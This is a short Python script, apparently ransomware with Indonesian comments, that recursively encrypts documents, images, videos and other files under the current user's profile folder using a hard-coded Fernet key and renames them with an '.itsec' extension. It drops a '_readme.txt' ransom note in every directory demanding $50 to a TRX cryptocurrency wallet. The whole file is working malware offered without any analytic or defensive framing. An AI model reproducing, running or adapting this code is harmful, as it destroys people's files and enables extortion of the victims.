import os
from time import sleep
from cryptography.fernet import Fernet

def encrypt(filename, key):
    f = Fernet(key)

    with open(filename, "rb") as file:
        #membaca file data
        file_data = file.read()
    # mengenkripsi data
    encrypted_data = f.encrypt(file_data)

    # menulis file yang terenkripsi
    with open(filename, "wb") as file:
        file.write(encrypted_data)


def attack(target):

    fl = ".c",".dll",".jpeg",".JPEG",".jpg",".JPG",".png",".PNG",".bmp",".BMP",".doc",".DOC",".docx",".xls",".xlsx",".ppt",".pptx","pdf",".mp4",".mkv",".mpeg",".avi",".ai",".ait",".cdr",".odt",".ods",".odp",".msi",".bat",".vbs",".html",".php",".js",".css"

    for p, d, f in os.walk(target):
        for name in f:
            if name.endswith((fl)):
                key1 = b'2fTwz_LurjD2tLZ3BSrELZy5u7NHTXLXa9xG1CR70IA='
                try:
                    encrypt(os.path.join(p, name),key1)
                    newFile = name +  ".itsec"
                    os.rename(os.path.join(p, name), os.path.join(p,newFile))
                except:
                    continue
            # Tinggalkan pesan pada lines dibawah ini
            try:
                lines = '''        !ATTENTION!
                Don't worry, you can return all your files!
                All your files like photos, database, documents,
                and other important are encrypted with strongest encryption and unique key.
                I want to continue my studies, But need some money,
                If you want to back your file, you can buy my decrypt tools
                Price of decrypt tools is $50
                Send your payment into TRX Wallet : TE4vx8wFoBh8ZPapGWrYynLuKYqk3hN3G9
                Your Personal Key is : ApgMpTktejvMpkpQ
                Thank You For Your Attention (*v*)'''
                with open(p + '\\' + '_readme.txt', 'w') as f:
                    f.writelines(lines)
            except PermissionError:
                problem = "Tidak bisa di isi file"

if __name__ == '__main__':
    t0 = os.environ["USERPROFILE"]
    attack(t0)